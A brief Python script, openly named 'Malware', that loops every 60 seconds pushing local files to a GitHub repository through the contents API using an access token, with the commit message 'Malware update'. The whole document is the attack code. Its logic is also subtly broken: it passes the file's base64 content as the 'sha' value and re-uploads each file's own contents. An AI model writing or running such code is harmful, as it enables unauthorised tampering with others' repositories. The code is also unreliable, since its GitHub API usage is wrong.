import os
import time
import base64
import requests

class Malware:
    def __init__(self, repo_url, access_token):
        self.repo_url = repo_url
        self.access_token = access_token
        self.headers = {
            'Authorization': f'token {self.access_token}',
            'Accept': 'application/vnd.github.v3+json'
        }

    def encode_file(self, file_path):
        with open(file_path, 'rb') as file:
            encoded_content = base64.b64encode(file.read()).decode('utf-8')
        return encoded_content

    def update_file(self, file_path, new_content):
        encoded_content = self.encode_file(file_path)
        data = {
            'message': 'Malware update',
            'content': new_content,
            'sha': encoded_content
        }
        response = requests.put(self.repo_url + file_path, json=data, headers=self.headers)
        if response.status_code == 200:
            print(f'File {file_path} updated successfully!')
        else:
            print(f'Failed to update file {file_path}. Status code: {response.status_code}')

    def run(self):
        while True:
            try:
                # Malware actions
                files = ['README.md', 'src/main.py']  # List of files to modify
                for file in files:
                    new_content = self.encode_file(file)
                    self.update_file(file, new_content)

                # Delay before next iteration
                time.sleep(60)  # Run every 60 seconds
            except KeyboardInterrupt:
                print('Malware execution interrupted.')
                break

if __name__ == '__main__':
    repo_url = 'https://api.github.com/repos/username/repository/contents/'
    access_token = 'your_github_access_token'
    malware = Malware(repo_url, access_token)
    malware.run()